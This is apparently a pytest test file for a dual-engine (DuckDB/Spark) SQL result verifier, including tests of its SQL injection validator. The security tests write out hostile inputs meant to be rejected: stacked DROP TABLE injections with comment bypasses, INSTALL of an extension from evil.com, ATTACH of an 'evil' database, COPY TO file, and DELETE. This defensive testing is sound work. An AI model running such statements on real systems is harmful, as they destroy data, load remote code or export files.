"""Phase 7B PhysicalVerifier 测试——双引擎执行 + 结果对比。

覆盖：
- ResultCanonicalizer 规范化策略（排序/NULL/NaN/Decimal/去重）
- DuckDB 真实执行（SQL 查询本地 Parquet 快照）
- Spark 执行 mock（PySpark 环境不可用时）
- PhysicalVerificationStatus 精确状态（禁止泛化 PASS）
- 不支持类型标记 UNSUPPORTED_SEMANTICS
- 双引擎结果对比（一致/不一致/错误）
"""

from __future__ import annotations

import os
import tempfile

import pytest

from tianshu_datadev.spark.executor import (
    LocalSparkExecutor,
    SparkExecutionResult,
    SparkExecutionStatus,
)
from tianshu_datadev.spark.physical_verifier import (
    CanonicalizationError,
    DiffDetail,
    EngineExecutionResult,
    PhysicalVerificationStatus,
    PhysicalVerifier,
    ResultCanonicalizer,
    _has_multiple_statements,
    _register_parquet_views,
    _strip_sql_comments,
    _validate_select_sql,
)

# ════════════════════════════════════════════
# ResultCanonicalizer 测试
# ════════════════════════════════════════════


class TestResultCanonicalizer:
    """ResultCanonicalizer 规范化策略测试。"""

    def test_column_name_normalization(self):
        """列名归一化——去表前缀、统一小写。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"od.order_id": "1", "od.AMOUNT": 100},
            {"od.order_id": "2", "od.amount": 200},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["od.order_id"],
        )

        # 列名归一化为 order_id, amount
        for row in result:
            assert "order_id" in row
            assert "amount" in row
            assert "od.order_id" not in row

    def test_null_value_normalization(self):
        """NULL 值 → 空字符串。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "name": None},
            {"id": "2", "name": "Alice"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"],
        )

        assert result[0]["name"] == ""
        assert result[1]["name"] == "Alice"  # 值归一化保留原大小写

    def test_nan_value_normalization(self):
        """NaN → 空字符串。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "score": float("nan")},
            {"id": "2", "score": 95.5},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"],
        )

        assert result[0]["score"] == ""
        assert result[1]["score"] == "95.5"

    def test_ordering_by_keys(self):
        """按指定键排序——确保对比确定性。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "3", "val": "c"},
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"],
        )

        assert result[0]["id"] == "1"
        assert result[1]["id"] == "2"
        assert result[2]["id"] == "3"

    def test_deduplication(self):
        """去重——重复行只保留一条。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "val": "a"},
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"], deduplicate=True,
        )

        assert len(result) == 2

    def test_empty_rows(self):
        """空行列表——返回空列表。"""
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer.canonicalize([], order_keys=["id"])
        assert result == []

    def test_missing_order_keys_raises(self):
        """无排序键且不去重 → CanonicalizationError。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        with pytest.raises(CanonicalizationError):
            canonicalizer.canonicalize(rows, order_keys=None, deduplicate=False)

    def test_no_order_keys_with_dedup_passes(self):
        """无排序键但去重——可以对比（行集合等价）。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=None, deduplicate=True,
        )
        assert len(result) == 2


# ════════════════════════════════════════════
# DuckDB 真实执行测试（需要 duckdb + pyarrow）
# ════════════════════════════════════════════


@pytest.fixture
def temp_parquet_dir():
    """创建含测试 Parquet 文件的临时目录——DuckDB 真实执行使用。"""
    import pyarrow as pa

    tmpdir = tempfile.mkdtemp(prefix="tianshu_physver_")

    # 创建测试数据并写入 Parquet
    table = pa.table({
        "order_id": ["1", "2", "3"],
        "amount": [100, 200, 150],
        "region": ["east", "west", "east"],
    })
    import pyarrow.parquet as pq
    pq.write_table(table, os.path.join(tmpdir, "order_info.parquet"))

    yield tmpdir

    # 清理
    import shutil
    shutil.rmtree(tmpdir, ignore_errors=True)


class TestDuckDBExecution:
    """DuckDB 真实执行——从 Parquet 快照读取并执行 SQL。"""

    def test_duckdb_simple_query(self, temp_parquet_dir):
        """简单 DuckDB 查询——SELECT * FROM 快照视图。"""
        verifier = PhysicalVerifier()
        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)

        assert result.status == SparkExecutionStatus.SUCCESS
        assert len(result.output_rows) == 3
        # 第一行
        row = result.output_rows[0]
        assert row["order_id"] == "1"
        assert row["amount"] == 100

    def test_duckdb_aggregate_query(self, temp_parquet_dir):
        """DuckDB 聚合查询——GROUP BY + COUNT。"""
        verifier = PhysicalVerifier()
        sql = (
            'SELECT "region", COUNT(*) AS cnt '
            'FROM "order_info" GROUP BY "region" '
            'ORDER BY "region"'
        )
        result = verifier._execute_duckdb(sql, temp_parquet_dir)

        assert result.status == SparkExecutionStatus.SUCCESS
        assert len(result.output_rows) == 2  # east, west
        rows_by_region = {r["region"]: r["cnt"] for r in result.output_rows}
        assert rows_by_region["east"] == 2
        assert rows_by_region["west"] == 1

    def test_duckdb_rejects_dangerous_sql(self, temp_parquet_dir):
        """危险 SQL（DROP）→ SECURITY_REJECTED。"""
        verifier = PhysicalVerifier()
        sql = 'DROP TABLE "order_info"'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)

        assert result.status == SparkExecutionStatus.SECURITY_REJECTED


# ════════════════════════════════════════════
# DuckDB SQL 安全校验测试
# ════════════════════════════════════════════


class TestDuckDBSecurity:
    """DuckDB SQL 安全校验——白名单 + 黑名单纵深防御。

    验证 _validate_select_sql 对各类危险 SQL 的拒绝能力，
    以及 _register_parquet_views 的参数化查询和路径安全。
    """

    # ── SQL 安全校验单元测试 ──

    def test_validate_select_simple(self):
        """简单 SELECT 通过校验。"""
        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_select_aggregate(self):
        """SELECT + GROUP BY + ORDER BY 通过校验。"""
        sql = 'SELECT "region", COUNT(*) AS cnt FROM "order_info" GROUP BY "region" ORDER BY "region"'
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_select_with_join(self):
        """SELECT ... JOIN 通过校验。"""
        sql = (
            'SELECT a."order_id", a."amount" '
            'FROM "order_info" a JOIN "order_info" b ON a."order_id" = b."order_id" '
            'ORDER BY a."order_id"'
        )
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_select_with_subquery(self):
        """SELECT 含子查询通过校验。"""
        sql = (
            'SELECT "order_id", "amount" FROM "order_info" '
            'WHERE "amount" > (SELECT AVG("amount") FROM "order_info") '
            'ORDER BY "order_id"'
        )
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_with_select(self):
        """WITH ... SELECT 通过校验。"""
        sql = (
            'WITH regional AS (SELECT "region", AVG("amount") AS avg_amt '
            'FROM "order_info" GROUP BY "region") '
            'SELECT * FROM regional ORDER BY "region"'
        )
        result = _validate_select_sql(sql)
        assert result == sql

    def test_rejects_multi_statement(self):
        """拒绝多语句——分号分隔。"""
        sql = 'SELECT * FROM "order_info"; DROP TABLE "order_info"'
        with pytest.raises(ValueError, match="多语句"):
            _validate_select_sql(sql)

    def test_rejects_line_comment_bypass(self):
        """拒绝行注释绕过——-- 后的 DROP。"""
        sql = 'SELECT * FROM "order_info";--\nDROP TABLE "order_info"'
        with pytest.raises(ValueError, match="多语句"):
            _validate_select_sql(sql)

    def test_rejects_block_comment_bypass(self):
        """拒绝块注释绕过——/* */ 后的 DROP。"""
        sql = 'SELECT * FROM "order_info";/*comment*/DROP TABLE "order_info"'
        with pytest.raises(ValueError, match="多语句"):
            _validate_select_sql(sql)

    def test_rejects_attach_database(self):
        """拒绝 ATTACH DATABASE。"""
        sql = "ATTACH DATABASE '/tmp/evil.db' AS evil"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_install_extension(self):
        """拒绝 INSTALL——禁止安装扩展。"""
        sql = "INSTALL 'http://evil.com/malware.duckdb_extension'"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_insert(self):
        """拒绝 INSERT。"""
        sql = 'INSERT INTO "order_info" VALUES (4, 500, \'north\')'
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_copy_to_file(self):
        """拒绝 COPY TO——禁止文件导出。"""
        sql = "COPY (SELECT * FROM \"order_info\") TO '/tmp/export.csv'"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_pragma(self):
        """拒绝 PRAGMA——禁止数据库级操作。"""
        sql = "PRAGMA database_list"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_drop_table(self):
        """拒绝 DROP TABLE（黑名单关键词）。"""
        sql = "DROP TABLE x"
        with pytest.raises(ValueError):
            _validate_select_sql(sql)

    def test_rejects_delete(self):
        """拒绝 DELETE（黑名单关键词）。"""
        sql = "DELETE FROM x WHERE 1=1"
        with pytest.raises(ValueError):
            _validate_select_sql(sql)

    def test_select_with_keyword_in_string_allowed(self):
        """SELECT 中字符串含 DROP 关键词——允许（剥离字面量后校验）。"""
        sql = "SELECT 'DROP TABLE warning--ignore' AS msg FROM \"order_info\" ORDER BY \"order_id\""
        result = _validate_select_sql(sql)
        assert result == sql

    def test_select_with_escaped_quote_in_string(self):
        """字符串中 SQL 转义引号 '' 后含关键词——允许。"""
        sql = "SELECT 'it''s a DROP test' AS msg FROM \"order_info\""
        result = _validate_select_sql(sql)
        assert result == sql

    def test_comment_inside_string_not_stripped(self):
        """字符串内的 -- 不当作注释去除——保留原样，多语句检测不触发。"""
        sql = "SELECT '-- this is not a comment' AS note FROM \"order_info\""
        # 不去除引号内容中的 --，结果无分号多语句，应通过
        result = _validate_select_sql(sql)
        assert result == sql

    # ── 注释去除单元测试 ──

    def test_strip_line_comment(self):
        """去除行注释。"""
        result = _strip_sql_comments("SELECT 1 -- this is a comment\nFROM x")
        assert "comment" not in result
        assert "SELECT 1" in result
        assert "FROM x" in result

    def test_strip_block_comment(self):
        """去除块注释。"""
        result = _strip_sql_comments("SELECT /* inline */ 1 FROM /* multi\nline */ x")
        assert "inline" not in result
        assert "multi" not in result
        assert "/*" not in result
        assert "*/" not in result
        assert "1 FROM" in result

    # ── 多语句检测单元测试 ──

    def test_has_multiple_statements_true(self):
        """检测到引号外的分号。"""
        assert _has_multiple_statements("SELECT 1; SELECT 2") is True

    def test_has_multiple_statements_false(self):
        """单语句无引号外分号。"""
        assert _has_multiple_statements("SELECT 'a;b' AS x") is False

    def test_has_multiple_statements_semicolon_in_string(self):
        """分号在引号内——不算多语句。"""
        assert _has_multiple_statements("SELECT 'hello;world' AS x") is False

    # ── 集成测试：_execute_duckdb 安全拒绝 ──

    def test_execute_rejects_multi_statement(self, temp_parquet_dir):
        """_execute_duckdb 拒绝多语句——SECURITY_REJECTED。"""
        verifier = PhysicalVerifier()
        sql = 'SELECT * FROM "order_info"; DROP TABLE "order_info"'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)
        assert result.status == SparkExecutionStatus.SECURITY_REJECTED
        assert "多语句" in result.error_message

    def test_execute_rejects_insert(self, temp_parquet_dir):
        """_execute_duckdb 拒绝 INSERT——SECURITY_REJECTED。"""
        verifier = PhysicalVerifier()
        sql = 'INSERT INTO "order_info" VALUES (4, 500, \'north\')'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)
        assert result.status == SparkExecutionStatus.SECURITY_REJECTED

    # ── 视图注册安全测试 ──

    def test_register_view_invalid_name_skipped(self, temp_parquet_dir):
        """非法视图名（含特殊字符）→ 跳过注册。"""
        import duckdb

        # 在 temp 目录下创建非法名称的 Parquet 文件
        bad_filename = "bad-table;name.parquet"
        bad_path = os.path.join(temp_parquet_dir, bad_filename)

        import pyarrow as pa
        import pyarrow.parquet as pq
        table = pa.table({"id": ["1"], "val": [10]})
        pq.write_table(table, bad_path)

        con = duckdb.connect()
        _register_parquet_views(con, temp_parquet_dir)

        # 非法名称不应注册为视图——查询应失败
        try:
            con.execute('SELECT * FROM "bad-table;name"')
            # 如果没抛异常，说明注册了（不应发生）
            pytest.fail("非法视图名不应被注册")
        except Exception:
            pass  # 预期：视图不存在
        finally:
            con.close()
            os.remove(bad_path)

    def test_register_view_valid_name_works(self, temp_parquet_dir):
        """合法视图名正常注册——可查询。"""
        import duckdb

        con = duckdb.connect()
        _register_parquet_views(con, temp_parquet_dir)

        # order_info.parquet 应注册为 "order_info" 视图
        result = con.execute('SELECT COUNT(*) FROM "order_info"').fetchone()
        assert result[0] == 3
        con.close()


# ════════════════════════════════════════════
# PhysicalVerifier mock 测试
# ════════════════════════════════════════════


class _MockSparkExecutor:
    """Mock Spark 执行器——返回预设结果，不启动真实 PySpark。"""

    def __init__(self, rows: list[dict] | None = None, success: bool = True) -> None:
        self._rows = rows or []
        self._success = success
        self._call_count = 0

    def execute(self, pyspark_code: str, data_dir: str | None = None,
                output_var: str = "result_df") -> SparkExecutionResult:
        self._call_count += 1
        if self._success:
            return SparkExecutionResult(
                status=SparkExecutionStatus.SUCCESS,
                output_rows=list(self._rows),
                execution_time_ms=10.0,
            )
        else:
            return SparkExecutionResult(
                status=SparkExecutionStatus.RUNTIME_ERROR,
                error_message="Mock Spark error",
            )


class TestPhysicalVerifierWithMock:
    """PhysicalVerifier 使用 mock Spark 执行器——覆盖对比逻辑。"""

    def test_result_consistent(self, temp_parquet_dir):
        """DuckDB 和 Spark 结果一致 → RESULT_CONSISTENT。"""
        # 准备与 DuckDB 输出一致的数据
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east"},
            {"order_id": "2", "amount": 200, "region": "west"},
            {"order_id": "3", "amount": 150, "region": "east"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        pyspark = 'result_df = input_df.orderBy("order_id")'

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT
        assert report.duckdb_result is not None
        assert report.spark_result is not None
        assert report.duckdb_result.success
        assert report.spark_result.success
        assert report.row_count_match

    def test_result_mismatch(self, temp_parquet_dir):
        """DuckDB 和 Spark 结果不一致 → RESULT_MISMATCH。"""
        # Spark 返回不同数据
        mismatched_rows = [
            {"order_id": "1", "amount": 999, "region": "east"},  # 不同 amount
        ]
        mock_spark = _MockSparkExecutor(rows=mismatched_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        pyspark = 'result_df = input_df.orderBy("order_id")'

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_MISMATCH
        assert len(report.diffs) > 0

    def test_unsupported_step_types(self, temp_parquet_dir):
        """Window step → UNSUPPORTED_SEMANTICS。"""
        verifier = PhysicalVerifier()

        report = verifier.verify(
            sql_query="SELECT 1",
            pyspark_code="result_df = input_df",
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            uncovered_step_types=["window"],
        )

        assert report.status == PhysicalVerificationStatus.UNSUPPORTED_SEMANTICS
        assert "window" in report.uncovered_step_types

    def test_canonicalization_needed_no_order_keys(self, temp_parquet_dir):
        """无排序键多行结果 → CANONICALIZATION_NEEDED。"""
        rows = [
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        mock_spark = _MockSparkExecutor(rows=rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info"'  # 无 ORDER BY
        pyspark = "result_df = input_df"  # 无排序

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            order_keys=None,  # 不指定排序键
        )

        assert report.status == PhysicalVerificationStatus.CANONICALIZATION_NEEDED

    def test_spark_execution_error(self, temp_parquet_dir):
        """Spark 执行失败 → EXECUTION_ERROR。"""
        mock_spark = _MockSparkExecutor(success=False)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info"'
        pyspark = "result_df = input_df"

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.EXECUTION_ERROR
        assert "Mock Spark error" in report.error_message


# ════════════════════════════════════════════
# PhysicalVerificationReport 结构测试
# ════════════════════════════════════════════


class TestPhysicalVerificationReport:
    """报告结构和状态语义测试。"""

    def test_status_no_generic_pass(self):
        """所有状态值不含 "PASS" 字符串。"""
        for status in PhysicalVerificationStatus:
            assert "PASS" not in status.value
            assert "Go" not in status.value
            assert "No-Go" not in status.value

    def test_report_id_deterministic(self):
        """相同输入 → 相同 report_id。"""
        id1 = PhysicalVerifier._generate_report_id("hash_a", "snap_1")
        id2 = PhysicalVerifier._generate_report_id("hash_a", "snap_1")
        assert id1 == id2

    def test_report_id_different_for_different_inputs(self):
        """不同输入 → 不同 report_id。"""
        id1 = PhysicalVerifier._generate_report_id("hash_a", "snap_1")
        id2 = PhysicalVerifier._generate_report_id("hash_b", "snap_1")
        assert id1 != id2

    def test_diff_detail_structure(self):
        """DiffDetail 结构完整。"""
        diff = DiffDetail(
            row_index=0,
            column="amount",
            duckdb_value="100",
            spark_value="999",
            description="值不一致",
        )
        assert diff.row_index == 0
        assert diff.column == "amount"

    def test_engine_execution_result_structure(self):
        """EngineExecutionResult 结构完整。"""
        result = EngineExecutionResult(
            engine="duckdb",
            success=True,
            execution_time_ms=15.5,
            raw_row_count=100,
            canonical_row_count=100,
            sample_rows=[{"id": "1"}],
        )
        assert result.engine == "duckdb"
        assert result.success

    def test_not_executed_status_exists(self):
        """NOT_EXECUTED 状态存在——用于尚未执行的场景。"""
        assert hasattr(PhysicalVerificationStatus, "NOT_EXECUTED")


# ════════════════════════════════════════════
# 真实 PySpark 执行集成测试（--run-slow）
# ════════════════════════════════════════════


# 8 种 Phase 6A+6B step 类型的参数化用例
# 每项：(用例名, SQL, PySpark DSL, 排序键)
_REAL_SPARK_CASES: list[tuple[str, str, str, list[str]]] = [
    # ── 6A step 类型 ──
    (
        "scan",
        'SELECT * FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.orderBy("order_id")',
        ["order_id"],
    ),
    (
        "filter",
        'SELECT * FROM "order_info" WHERE "amount" > 100 ORDER BY "order_id"',
        'result_df = input_df.filter(F.col("amount") > 100).orderBy("order_id")',
        ["order_id"],
    ),
    (
        "project",
        'SELECT "order_id", "amount" FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.select("order_id", "amount").orderBy("order_id")',
        ["order_id"],
    ),
    (
        "sort",
        'SELECT * FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.orderBy("order_id")',
        ["order_id"],
    ),
    (
        "limit",
        'SELECT * FROM "order_info" ORDER BY "order_id" LIMIT 2',
        'result_df = input_df.orderBy("order_id").limit(2)',
        ["order_id"],
    ),
    # ── 6B step 类型 ──
    (
        "aggregate",
        'SELECT "region", COUNT(*) AS cnt, SUM("amount") AS total '
        'FROM "order_info" GROUP BY "region" ORDER BY "region"',
        'result_df = input_df.groupBy("region").agg('
        'F.count("*").alias("cnt"), F.sum("amount").alias("total")'
        ').orderBy("region")',
        ["region"],
    ),
    (
        "join",
        'SELECT a."order_id" AS order_id, a."amount" AS amount '
        'FROM "order_info" a JOIN "order_info" b ON a."order_id" = b."order_id" '
        'ORDER BY order_id',
        'result_df = input_df.alias("a").join('
        'input_df.alias("b"), '
        'F.col("a.order_id") == F.col("b.order_id")'
        ').select('
        'F.col("a.order_id").alias("order_id"), '
        'F.col("a.amount").alias("amount")'
        ').orderBy("order_id")',
        ["order_id"],
    ),
    (
        "case_when",
        'SELECT *, CASE WHEN "amount" > 150 THEN \'high\' ELSE \'low\' END AS category '
        'FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.withColumn('
        '"category", '
        'F.when(F.col("amount") > 150, "high").otherwise("low")'
        ').orderBy("order_id")',
        ["order_id"],
    ),
]


class TestRealSparkExecution:
    """真实 PySpark 子进程验证——双引擎结果一致性。

    每个用例：
    1. 在 DuckDB 中执行 SQL（基准引擎）
    2. 在真实 PySpark 子进程中执行 DSL（验证引擎）
    3. 断言 RESULT_CONSISTENT

    默认跳过（需 --run-slow），每次约 30s（SparkSession 启动开销）。
    """

    @pytest.fixture(scope="class")
    def spark_available(self):
        """检查真实 PySpark 环境是否可用——Java 版本不兼容时自动跳过。"""
        executor = LocalSparkExecutor()
        if not executor.check_environment():
            pytest.skip("PySpark 环境不可用（Java 版本不兼容或未安装 PySpark）")

    @pytest.mark.slow
    @pytest.mark.parametrize(
        "case_name,sql_query,pyspark_code,order_keys",
        _REAL_SPARK_CASES,
        ids=[c[0] for c in _REAL_SPARK_CASES],
    )
    def test_real_spark_consistency(
        self,
        temp_parquet_dir,
        spark_available,
        case_name,
        sql_query,
        pyspark_code,
        order_keys,
    ):
        """真实 PySpark 与 DuckDB 结果应一致。"""
        spark_executor = LocalSparkExecutor()
        verifier = PhysicalVerifier(spark_executor=spark_executor)

        report = verifier.verify(
            sql_query=sql_query,
            pyspark_code=pyspark_code,
            snapshot_dir=temp_parquet_dir,
            contract_hash=f"test_real_{case_name}",
            snapshot_id=f"snap_real_{case_name}",
            order_keys=order_keys,
        )

        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT, (
            f"[{case_name}] 预期 RESULT_CONSISTENT，实际 {report.status.value}。"
            f" 错误：{report.error_message}"
            f" DuckDB 行数：{report.duckdb_result.raw_row_count if report.duckdb_result else 'N/A'}"
            f" Spark 行数：{report.spark_result.raw_row_count if report.spark_result else 'N/A'}"
        )
